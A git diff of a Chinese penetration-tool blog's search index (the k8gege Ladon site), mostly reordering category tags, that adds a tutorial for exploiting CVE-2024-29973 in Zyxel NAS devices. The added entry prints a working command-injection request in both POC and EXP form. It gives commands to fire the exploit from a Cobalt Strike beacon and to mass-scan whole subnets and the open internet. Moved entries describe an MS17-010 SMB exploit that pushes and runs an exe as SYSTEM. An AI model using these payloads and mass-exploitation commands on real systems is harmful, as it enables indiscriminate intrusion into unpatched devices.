@@ -2818,6 +2818,68 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>Ladon CVE-2024-29973漏洞批量扫描教程</title>
+    <url>/p/CVE-2024-29973.html</url>
+    <content><![CDATA[<h1 id="Ladon-CVE-2024-29973-Zyxel漏洞批量扫描教程"><a href="#Ladon-CVE-2024-29973-Zyxel漏洞批量扫描教程" class="headerlink" title="Ladon CVE-2024-29973 Zyxel漏洞批量扫描教程"></a>Ladon CVE-2024-29973 Zyxel漏洞批量扫描教程</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/CVE-2024-29973.html";
+</script>
+
+
+<p>LadonEXP一键生成Poc/Exp，批量漏洞挖掘，快速获取权限。使用Ladon可对C段、B段、A段、全网批量扫描，0day/1day/Nday快速利用。</p>
+<h3 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h3><p>Ladon项目所涉及的技术、思路和工具仅供学习或授权渗透，非法用途后果自负。</p>
+<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>CVE-2024-29973</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Zyxel NAS542<br>Zyxel NAS326</p>
+<h3 id="应用指纹"><a href="#应用指纹" class="headerlink" title="应用指纹"></a>应用指纹</h3><p>app=”ZYXEL-NAS326”</p>
+<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Zyxel NAS542和Zyxel NAS326都是中国合勤（Zyxel）公司的产品。Zyxel NAS542是一款NAS（网络附加存储）设备。Zyxel NAS326是一款云存储 NAS。Zyxel NAS326 V5.21(AAZF.17)C0之前版本、NAS542 V5.21(ABAG.14)C0之前版本存在操作系统命令注入漏洞，该漏洞源于setCookie参数中存在命令注入漏洞，从而导致攻击者可通过HTTP POST请求来执行某些操作系统 (OS) 命令。</p>
+<h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><p>LadonExp.ini填写漏洞相关信息，生成POC/EXP会生成本文MarkDown使用教程</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2024-29973/cfg.png"></p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__(<span class="string">"subprocess"</span>).check_output(<span class="string">"id"</span>,+shell=True)%23</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2024-29973/poc.png"></p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__(<span class="string">"subprocess"</span>).check_output(<span class="string">"<span class="variable">$cmd</span>$"</span>,+shell=True)%23</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2024-29973/exp.png"></p>
+<p>PS: 使用LadonExp填上对应内容，即可生成POC/EXP</p>
+<h3 id="POC独立使用"><a href="#POC独立使用" class="headerlink" title="POC独立使用"></a>POC独立使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CVE-2024-29973.exe http://192.168.1.8</span><br></pre></td></tr></table></figure>
+<p>PS: 部分https站点需Ladon调用扫描</p>
+<h3 id="EXP执行命令"><a href="#EXP执行命令" class="headerlink" title="EXP执行命令"></a>EXP执行命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CVE-2024-29973.exe http://192.168.1.8 whoami</span><br></pre></td></tr></table></figure>
+<p>PS: 将payload中的cmd命令如whoami替换成$cmd$ 即可生成EXP</p>
+<h3 id="CS使用POC"><a href="#CS使用POC" class="headerlink" title="CS使用POC"></a>CS使用POC</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; execute-assembly C:\Ladon\CVE-2024-29973.exe http://192.168.1.8</span><br></pre></td></tr></table></figure>
+<p>PS: Cobalt Strike内存加载CVE-2024-29973.exe</p>
+<h3 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon http://192.168.1.8 CVE-2024-29973.exe</span><br><span class="line">Ladon http://192.168.1.8 CVE-2024-29973.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定IP"><a href="#指定IP" class="headerlink" title="指定IP"></a>指定IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8 CVE-2024-29973.exe</span><br><span class="line">Ladon 192.168.1.8 CVE-2024-29973.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量URL"><a href="#批量URL" class="headerlink" title="批量URL"></a>批量URL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure>
+<p>PS：TXT可存放IP、IP:Port、URL等格式</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2024-29973/scan.png"></p>
+<h3 id="批量IP"><a href="#批量IP" class="headerlink" title="批量IP"></a>批量IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ip.txt CVE-2024-29973.exe</span><br><span class="line">Ladon noping ip.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定C段"><a href="#指定C段" class="headerlink" title="指定C段"></a>指定C段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 CVE-2024-29973.exe</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-29973.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 CVE-2024-29973.dll</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-29973.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定B段"><a href="#指定B段" class="headerlink" title="指定B段"></a>指定B段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/b CVE-2024-29973.exe</span><br><span class="line">Ladon noping 192.168.1.8/b CVE-2024-29973.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b CVE-2024-29973.dll</span><br><span class="line">Ladon noping 192.168.1.8/b CVE-2024-29973.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定A段"><a href="#指定A段" class="headerlink" title="指定A段"></a>指定A段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/a CVE-2024-29973.exe</span><br><span class="line">Ladon noping 192.168.1.8/a CVE-2024-29973.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a CVE-2024-29973.dll</span><br><span class="line">Ladon noping 192.168.1.8/a CVE-2024-29973.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量C段"><a href="#批量C段" class="headerlink" title="批量C段"></a>批量C段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ip24.txt CVE-2024-29973.exe</span><br><span class="line">Ladon ipc.txt CVE-2024-29973.exe</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt CVE-2024-29973.exe</span><br><span class="line">Ladon noping ipc.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure>
+<p>PS: TXT存放多个目标的C段IP</p>
+<h3 id="批量B段"><a href="#批量B段" class="headerlink" title="批量B段"></a>批量B段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ip16.txt CVE-2024-29973.exe</span><br><span class="line">Ladon noping ip16.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure>
+<p>PS: TXT存放多个目标的B段IP</p>
+<h3 id="批量网段"><a href="#批量网段" class="headerlink" title="批量网段"></a>批量网段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cidr.txt CVE-2024-29973.exe</span><br><span class="line">Ladon noping cidr.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure>
+<p>PS: TXT存放各种IP网段，全网无差别扫描</p>
+<h3 id="DownLoad"><a href="#DownLoad" class="headerlink" title="DownLoad"></a>DownLoad</h3><p><a href="https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar</a><br><a href="https://github.com/k8gege/Ladon/blob/master/LadonExp.exe" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/blob/master/LadonExp.exe</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+        <category>Exp</category>
+      </categories>
+      <tags>
+        <tag>Zyxel</tag>
+        <tag>CVE-2024-29973</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ladon渗透绕过WAF、EDR、防火墙扫描</title>
     <url>/p/bypassEDR.html</url>
     <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
@@ -3277,8 +3339,8 @@ window.location.href="/Ladon/CVE-2022-36537.html";
 </div>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -6087,8 +6149,8 @@ window.location.href="http://k8gege.org/Ladon/cve-2020-0688.html";
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>CVE-2020-0688</tag>
@@ -6790,8 +6852,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>内网渗透</category>
         <category>远程执行</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -7630,8 +7692,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -7654,8 +7716,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -7679,8 +7741,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -7710,8 +7772,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -7913,8 +7975,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -8235,8 +8297,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">https://github.com/k8gege/MS17010EXP</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -8347,26 +8409,6 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
-    <title>Cobalt Strike TeamServer For Windows</title>
-    <url>/p/22e5f4a8.html</url>
-    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
-<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
-<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
-<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
-<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
-<p><strong>0x003 下载</strong></p>
-<p>TeamServer.exe</p>
-<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
     <url>/p/9cffe32c.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
@@ -8385,14 +8427,34 @@ Microsoft Windows 10 for 32-bit Systems 0
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Cobalt Strike</category>
         <category>Metasploit</category>
+        <category>Cobalt Strike</category>
         <category>ShellCode</category>
       </categories>
       <tags>
         <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
         <tag>Metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cobalt Strike TeamServer For Windows</title>
+    <url>/p/22e5f4a8.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
+<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
+<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
+<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
+<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
+<p><strong>0x003 下载</strong></p>
+<p>TeamServer.exe</p>
+<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
       </tags>
   </entry>
   <entry>
@@ -8679,8 +8741,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Cobalt Strike</category>
         <category>Metasploit</category>
+        <category>Cobalt Strike</category>
         <category>ShellCode</category>
         <category>Python</category>
       </categories>
@@ -8689,33 +8751,6 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
         <tag>Cobalt Strike</tag>
         <tag>Metasploit</tag>
         <tag>BypassAV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -8815,6 +8850,33 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -8964,8 +9026,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -9136,9 +9198,9 @@ from pprint import pprint
         <category>主机发现</category>
         <category>源码</category>
         <category>内网渗透</category>
+        <category>嗅探</category>
         <category>信息收集</category>
         <category>编程</category>
-        <category>嗅探</category>
         <category>Python</category>
       </categories>
       <tags>
